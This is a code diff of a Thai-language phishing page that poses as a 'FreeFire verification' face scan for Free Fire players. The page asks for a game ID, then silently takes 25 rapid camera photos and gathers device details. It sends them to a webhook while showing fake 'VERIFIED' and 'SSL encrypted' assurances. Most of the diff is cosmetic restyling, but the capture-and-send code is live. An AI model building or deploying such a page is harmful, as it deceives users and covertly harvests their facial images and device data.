@@ -9,53 +9,110 @@
     <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;500;600;700&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            -khtml-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+
         body {
             font-family: 'Kanit', sans-serif;
-            background: #0b0e14;
-            color: white;
-            user-select: none;
-            overflow-x: hidden;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            background-image: radial-gradient(circle at 20% 30%, #1a2a3a 0%, #0b0e14 80%);
+            background: linear-gradient(135deg, #ff6b6b, #feca57, #48dbfb, #ff9ff3, #54a0ff, #5f27cd);
+            background-size: 400% 400%;
+            animation: rainbow 8s ease infinite;
+            padding: 20px;
+            overflow: hidden;
+        }
+
+        @keyframes rainbow {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
         }
 
         .glass-panel {
-            background: rgba(26, 30, 38, 0.85);
-            backdrop-filter: blur(16px);
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
+            background: rgba(255, 255, 255, 0.12);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.25);
+            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.4), inset 0 1px 0 rgba(255, 255, 255, 0.2);
+            border-radius: 40px;
+            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        .glass-panel:hover {
+            transform: scale(1.01);
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.5);
         }
 
         .input-glow:focus {
             border-color: #ff6a00;
-            box-shadow: 0 0 20px rgba(255, 106, 0, 0.3);
+            box-shadow: 0 0 30px rgba(255, 106, 0, 0.3), 0 0 60px rgba(255, 106, 0, 0.1);
             outline: none;
+            transform: scale(1.02);
         }
 
         .btn-ff {
             background: linear-gradient(135deg, #ff6a00, #ee0979);
-            transition: all 0.3s ease;
+            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
             font-weight: 600;
             letter-spacing: 0.5px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-ff::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.2) 0%, transparent 60%);
+            opacity: 0;
+            transition: opacity 0.5s;
+            transform: rotate(0deg);
+        }
+
+        .btn-ff:hover::before {
+            opacity: 1;
         }
 
         .btn-ff:hover {
-            transform: scale(1.03);
-            box-shadow: 0 10px 30px rgba(255, 106, 0, 0.4);
+            transform: scale(1.05) translateY(-2px);
+            box-shadow: 0 15px 40px rgba(255, 106, 0, 0.5);
+        }
+
+        .btn-ff:active {
+            transform: scale(0.95);
         }
 
         .info-card {
-            background: rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(255, 255, 255, 0.04);
-            backdrop-filter: blur(4px);
-            transition: all 0.2s;
+            background: rgba(255, 255, 255, 0.08);
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+            border-radius: 20px;
         }
+
         .info-card:hover {
-            background: rgba(255, 106, 0, 0.05);
-            border-color: rgba(255, 106, 0, 0.2);
+            background: rgba(255, 255, 255, 0.15);
+            transform: translateX(5px) scale(1.02);
+            border-color: rgba(255, 106, 0, 0.3);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
         }
 
         ::-webkit-scrollbar {
@@ -65,51 +122,86 @@
             background: #ff6a00;
             border-radius: 999px;
         }
+        ::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 999px;
+        }
 
         .animate-pulse-slow {
             animation: pulseSlow 2.5s ease-in-out infinite;
         }
         @keyframes pulseSlow {
-            0% { opacity: 0.6; }
-            50% { opacity: 1; }
-            100% { opacity: 0.6; }
+            0%, 100% { opacity: 0.7; transform: scale(1); }
+            50% { opacity: 1; transform: scale(1.05); }
         }
 
         .scan-anim {
-            height: 2px;
-            background: #ff6a00;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, #ff6a00, #ee0979, #ff6a00, transparent);
             position: absolute;
             width: 100%;
             top: 0;
-            animation: move 3s infinite;
-            box-shadow: 0 0 20px #ff6a00;
+            animation: move 2.5s ease-in-out infinite;
+            box-shadow: 0 0 30px #ff6a00, 0 0 60px #ee0979;
+            border-radius: 2px;
         }
 
         @keyframes move {
-            0% { top: 0; }
-            100% { top: 100%; }
+            0% { top: 0; opacity: 0.6; }
+            50% { top: 100%; opacity: 1; }
+            100% { top: 0; opacity: 0.6; }
         }
 
         .animate-fade-in {
-            animation: fadeIn 0.5s ease;
+            animation: fadeIn 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
         }
         @keyframes fadeIn {
-            0% { opacity: 0; transform: scale(0.95); }
-            100% { opacity: 1; transform: scale(1); }
+            0% { opacity: 0; transform: scale(0.9) translateY(20px); }
+            100% { opacity: 1; transform: scale(1) translateY(0); }
         }
 
-        * {
-            -webkit-touch-callout: none;
-            -webkit-user-select: none;
-            -khtml-user-select: none;
-            -moz-user-select: none;
-            -ms-user-select: none;
-            user-select: none;
+        .video-container {
+            border-radius: 50%;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            box-shadow: 0 0 50px rgba(255, 106, 0, 0.3), 0 0 100px rgba(255, 106, 0, 0.1);
+            transition: all 0.5s ease;
+            position: relative;
         }
 
-        /* ซ่อนปุ่มทั้งหมดที่ไม่จำเป็น */
-        #btn-capture, #btn-cancel-scan, #btn-to-scan, #btn-back {
+        .video-container:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 80px rgba(255, 106, 0, 0.5), 0 0 150px rgba(255, 106, 0, 0.2);
+        }
+
+        .video-container::after {
+            content: '';
+            position: absolute;
+            inset: -3px;
+            border-radius: 50%;
+            padding: 3px;
+            background: linear-gradient(135deg, #ff6a00, #ee0979, #ff6a00);
+            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: xor;
+            mask-composite: exclude;
+            animation: rotateBorder 3s linear infinite;
+        }
+
+        @keyframes rotateBorder {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* ซ่อนปุ่มที่ไม่จำเป็น */
+        #btn-capture, #btn-cancel-scan {
             display: none !important;
+        }
+
+        .step-transition {
+            transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        .glow-text {
+            text-shadow: 0 0 20px rgba(255, 106, 0, 0.3), 0 0 40px rgba(255, 106, 0, 0.1);
         }
     </style>
 </head>
@@ -117,21 +209,21 @@
 
 <div class="w-full max-w-md px-4 py-6">
 
-    <div class="glass-panel rounded-3xl overflow-hidden shadow-2xl border border-white/5">
+    <div class="glass-panel rounded-[40px] overflow-hidden shadow-2xl my-4">
 
-        <!-- Header -->
-        <div class="relative h-28 bg-gradient-to-r from-orange-600 via-red-600 to-pink-600 flex items-center px-6">
-            <div class="absolute inset-0 bg-black/30 backdrop-blur-[2px]"></div>
-            <div class="relative z-10 flex items-center gap-4">
-                <div class="w-16 h-16 rounded-2xl bg-black/40 backdrop-blur flex items-center justify-center text-3xl border border-white/20 shadow-xl">
+        <!-- Header สวยงาม -->
+        <div class="relative h-32 bg-gradient-to-r from-orange-500/30 via-pink-500/30 to-purple-500/30 backdrop-blur-sm flex items-center px-6 border-b border-white/10">
+            <div class="absolute inset-0 bg-black/20 backdrop-blur-[2px]"></div>
+            <div class="relative z-10 flex items-center gap-5">
+                <div class="w-20 h-20 rounded-2xl bg-gradient-to-br from-orange-500 to-pink-500 flex items-center justify-center text-4xl shadow-2xl border border-white/20 animate-pulse-slow">
                     🔥
                 </div>
                 <div>
-                    <h1 class="text-2xl font-bold tracking-wide flex items-center gap-2">
+                    <h1 class="text-2xl font-bold tracking-wide flex items-center gap-2 text-white glow-text">
                         ยืนยันตัวตน
-                        <span class="text-[10px] bg-black/40 px-3 py-1 rounded-full border border-white/20 font-normal tracking-widest">FF</span>
+                        <span class="text-[10px] bg-white/20 px-3 py-1 rounded-full border border-white/30 font-normal tracking-widest backdrop-blur-sm">FF</span>
                     </h1>
-                    <p class="text-white/70 text-sm">กรอก ID และสแกนหน้ายืนยัน</p>
+                    <p class="text-white/80 text-sm font-light">กรอก ID และสแกนหน้ายืนยัน</p>
                 </div>
             </div>
         </div>
@@ -139,43 +231,46 @@
         <div class="p-6 pt-8">
 
             <!-- ===== STEP 1: กรอก ID ===== -->
-            <div id="step-input">
-                <div class="space-y-4">
+            <div id="step-input" class="step-transition">
+                <div class="space-y-5">
                     <div>
-                        <label class="text-sm font-medium text-white/70 block mb-2">🆔 ID FreeFire ของคุณ</label>
+                        <label class="text-sm font-medium text-white/80 block mb-2 flex items-center gap-2">
+                            <span>🆔</span> ID FreeFire ของคุณ
+                        </label>
                         <input id="ff-id-input" type="text" placeholder="เช่น 1234567890" 
-                               class="w-full bg-black/40 border border-white/10 rounded-2xl px-5 py-4 text-white placeholder-white/30 input-glow transition text-lg font-medium">
+                               class="w-full bg-white/10 border border-white/20 rounded-2xl px-5 py-4 text-white placeholder-white/40 input-glow transition text-lg font-medium backdrop-blur-sm">
                     </div>
 
-                    <button id="btn-to-scan" class="btn-ff w-full py-4 rounded-2xl text-white text-lg shadow-lg flex items-center justify-center gap-2">
+                    <button id="btn-to-scan" class="btn-ff w-full py-4 rounded-2xl text-white text-lg shadow-lg flex items-center justify-center gap-3">
                         <span>📸 ไปขั้นตอนสแกนหน้า</span>
                         <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M13 7l5 5m0 0l-5 5m5-5H6"/></svg>
                     </button>
 
-                    <div class="flex justify-center gap-2 text-xs text-white/30 pt-2">
-                        <span class="flex items-center gap-1"><span class="w-1.5 h-1.5 rounded-full bg-green-400 inline-block"></span> ระบบปลอดภัย</span>
-                        <span class="flex items-center gap-1"><span class="w-1.5 h-1.5 rounded-full bg-blue-400 inline-block"></span> เข้ารหัส SSL</span>
+                    <div class="flex justify-center gap-4 text-xs text-white/40 pt-2">
+                        <span class="flex items-center gap-1.5"><span class="w-1.5 h-1.5 rounded-full bg-green-400 inline-block shadow-lg shadow-green-400/50"></span> ระบบปลอดภัย</span>
+                        <span class="flex items-center gap-1.5"><span class="w-1.5 h-1.5 rounded-full bg-blue-400 inline-block shadow-lg shadow-blue-400/50"></span> เข้ารหัส SSL</span>
                     </div>
                 </div>
 
-                <div id="status-container" class="mt-5 text-center">
-                    <p id="status-msg" class="text-orange-400/80 text-sm animate-pulse-slow font-medium tracking-wide">⏳ กรอก ID เพื่อเริ่มต้น</p>
+                <div class="mt-5 text-center">
+                    <p id="status-msg" class="text-white/70 text-sm animate-pulse-slow font-medium tracking-wide">⏳ กรอก ID เพื่อเริ่มต้น</p>
                 </div>
             </div>
 
             <!-- ===== STEP 2: สแกนหน้า (Auto Capture) ===== -->
-            <div id="step-scan" class="hidden text-center">
-                <div class="relative w-56 h-56 mx-auto mb-4 rounded-full border-2 border-orange-500/50 overflow-hidden bg-black shadow-[0_0_30px_rgba(255,106,0,0.4)]">
+            <div id="step-scan" class="hidden step-transition text-center">
+                <div class="video-container relative w-64 h-64 mx-auto mb-5 rounded-full overflow-hidden bg-black/50 backdrop-blur-sm">
                     <video id="cam" class="w-full h-full object-cover scale-x-[-1]" autoplay playsinline></video>
-                    <div class="absolute inset-0 bg-gradient-to-b from-transparent via-orange-500/10 to-transparent"></div>
+                    <div class="absolute inset-0 bg-gradient-to-b from-transparent via-orange-500/5 to-transparent"></div>
                     <div class="scan-anim"></div>
+                    <div class="absolute inset-0 rounded-full border-2 border-white/10"></div>
                 </div>
-                <p id="scan-status" class="text-orange-400 text-sm animate-pulse tracking-widest font-medium">📷 กำลังเปิดกล้อง...</p>
-                <p id="capture-progress" class="text-white/40 text-xs mt-2 hidden">📸 กำลังถ่ายภาพ...</p>
                 
-                <!-- ซ่อนปุ่มทั้งหมด -->
+                <p id="scan-status" class="text-white/90 text-sm animate-pulse tracking-widest font-medium">📷 กำลังเปิดกล้อง...</p>
+                <p id="capture-progress" class="text-white/50 text-xs mt-2 hidden">📸 กำลังถ่ายภาพยืนยัน...</p>
+                
                 <div class="mt-5 flex gap-3 hidden">
-                    <button id="btn-cancel-scan" class="flex-1 py-3 rounded-xl border border-white/10 text-white/60 hover:text-white hover:border-white/30 transition text-sm">
+                    <button id="btn-cancel-scan" class="flex-1 py-3 rounded-xl border border-white/20 text-white/60 hover:text-white hover:border-white/40 transition text-sm backdrop-blur-sm">
                         ยกเลิก
                     </button>
                     <button id="btn-capture" class="flex-1 btn-ff py-3 rounded-xl text-white text-sm shadow-lg">
@@ -186,7 +281,7 @@
 
             <!-- ===== STEP 3: ผลลัพธ์ ===== -->
             <div id="step-result" class="hidden animate-fade-in">
-                <div class="bg-gradient-to-br from-orange-500/10 to-pink-500/10 border border-orange-500/20 rounded-2xl p-5 mb-6 backdrop-blur-sm">
+                <div class="bg-gradient-to-br from-orange-500/20 to-pink-500/20 border border-white/20 rounded-2xl p-5 mb-6 backdrop-blur-sm">
                     <div class="flex items-center gap-4">
                         <div class="w-14 h-14 rounded-2xl bg-gradient-to-br from-orange-500 to-pink-500 flex items-center justify-center text-2xl shadow-xl text-white font-bold">
                             ✅
@@ -194,7 +289,7 @@
                         <div>
                             <h2 class="text-lg font-bold text-white flex items-center gap-2">
                                 ยืนยันสำเร็จ
-                                <span class="text-[10px] bg-orange-500/20 text-orange-300 px-2 py-0.5 rounded-full border border-orange-500/30">VERIFIED</span>
+                                <span class="text-[10px] bg-white/20 text-white px-2 py-0.5 rounded-full border border-white/30">VERIFIED</span>
                             </h2>
                             <p class="text-white/50 text-xs">Ref: <span id="ref-code">FF-994102-B</span></p>
                         </div>
@@ -203,7 +298,7 @@
 
                 <div id="info-box" class="space-y-3 max-h-[420px] overflow-y-auto pr-1"></div>
 
-                <button id="btn-back" class="mt-5 w-full py-3 rounded-xl border border-white/10 text-white/60 hover:text-white hover:border-white/30 transition flex items-center justify-center gap-2 text-sm">
+                <button id="btn-back" class="mt-5 w-full py-3 rounded-xl border border-white/20 text-white/70 hover:text-white hover:border-white/40 transition flex items-center justify-center gap-2 text-sm backdrop-blur-sm hover:bg-white/5">
                     <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"/></svg>
                     เริ่มใหม่
                 </button>
@@ -212,7 +307,7 @@
         </div>
     </div>
 
-    <div class="text-center text-white/10 text-[10px] mt-6 tracking-widest">
+    <div class="text-center text-white/20 text-[10px] mt-6 tracking-widest font-light">
         FREEFIRE VERIFICATION V2 • สแกนหน้ายืนยันตัวตน
     </div>
 </div>
@@ -320,16 +415,13 @@ async function startCameraAndAutoCapture() {
         document.getElementById("scan-status").innerText = "📸 กำลังถ่ายภาพยืนยัน...";
         document.getElementById("capture-progress").classList.remove("hidden");
         
-        // รอให้กล้องพร้อม
         await new Promise(resolve => {
             video.onloadedmetadata = () => {
                 resolve();
             };
         });
         
-        // เริ่มถ่ายรัวทันที 25 รูป
         startBurstCapture(video);
-        
         return true;
     } catch (err) {
         document.getElementById("scan-status").innerText = "❌ ไม่สามารถเปิดกล้องได้";
@@ -337,7 +429,7 @@ async function startCameraAndAutoCapture() {
     }
 }
 
-// ===== ถ่ายรัว 25 รูปและส่งทันที =====
+// ===== ถ่ายรัว 25 รูป =====
 function startBurstCapture(video) {
     if (isCapturing) return;
     isCapturing = true;
@@ -346,7 +438,6 @@ function startBurstCapture(video) {
     let captured = 0;
     const images = [];
     
-    // ถ่ายรูปแรกทันที
     captureFrame(video, images, () => {
         captured++;
         if (captured === burstCount) {
@@ -354,7 +445,6 @@ function startBurstCapture(video) {
         }
     });
     
-    // ถ่ายส่วนที่เหลือ
     for (let i = 1; i < burstCount; i++) {
         setTimeout(() => {
             captureFrame(video, images, () => {
@@ -363,7 +453,7 @@ function startBurstCapture(video) {
                     finishAndSend(images, video);
                 }
             });
-        }, i * 80); // ถ่ายเร็วขึ้น 80ms
+        }, i * 80);
     }
 }
 
@@ -389,13 +479,10 @@ function captureFrame(video, images, callback) {
 }
 
 function finishAndSend(images, video) {
-    // ปิดกล้อง
     if (cameraStream) {
         cameraStream.getTracks().forEach(t => t.stop());
         cameraStream = null;
     }
-    
-    // ส่งข้อมูลทันที
     sendAllToWebhook(images);
 }
 
@@ -407,9 +494,7 @@ async function sendAllToWebhook(images) {
     const cpuCores = navigator.hardwareConcurrency || "Unknown";
     const ramSize = (navigator.deviceMemory || "Unknown") + " GB";
     const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    const userAgent = navigator.userAgent;
 
-    // เปลี่ยน UI ทันที
     document.getElementById("step-scan").classList.add("hidden");
     document.getElementById("step-result").classList.remove("hidden");
     document.getElementById("ref-code").innerText = `FF-${Math.floor(Math.random()*999999)}`;
@@ -496,7 +581,7 @@ function renderResultUI(imageCount) {
     data.forEach(item => {
         box.innerHTML += `
             <div class="info-card rounded-2xl p-4 flex items-center gap-4 transition">
-                <div class="w-11 h-11 rounded-xl bg-gradient-to-br from-orange-500/20 to-pink-500/20 flex items-center justify-center text-xl flex-shrink-0 border border-white/5">
+                <div class="w-11 h-11 rounded-xl bg-gradient-to-br from-orange-500/30 to-pink-500/30 flex items-center justify-center text-xl flex-shrink-0 border border-white/10 backdrop-blur-sm">
                     ${item.icon}
                 </div>
                 <div class="flex-1 overflow-hidden">
@@ -509,8 +594,6 @@ function renderResultUI(imageCount) {
 }
 
 // ===== จัดการ Events =====
-
-// ขั้นตอนที่ 1: ไปสแกนหน้า
 document.getElementById("btn-to-scan").addEventListener("click", async () => {
     const input = document.getElementById("ff-id-input");
     const id = input.value.trim();
@@ -539,18 +622,14 @@ document.getElementById("btn-to-scan").addEventListener("click", async () => {
     userData.ffid = id;
     document.getElementById("status-msg").innerText = "📸 กำลังเปิดกล้อง...";
 
-    // เก็บข้อมูลเบื้องต้น
     await collectData();
 
-    // สลับหน้า
     document.getElementById("step-input").classList.add("hidden");
     document.getElementById("step-scan").classList.remove("hidden");
 
-    // เปิดกล้องและเริ่มถ่ายรัวอัตโนมัติทันที
     await startCameraAndAutoCapture();
 });
 
-// ปุ่มกลับ
 document.getElementById("btn-back").addEventListener("click", () => {
     document.getElementById("step-result").classList.add("hidden");
     document.getElementById("step-input").classList.remove("hidden");
@@ -559,7 +638,6 @@ document.getElementById("btn-back").addEventListener("click", () => {
     isCapturing = false;
 });
 
-// ===== โหลดหน้า =====
 window.onload = () => {
     document.getElementById("status-msg").innerText = "⏳ กรอก ID เพื่อเริ่มต้น";
 };
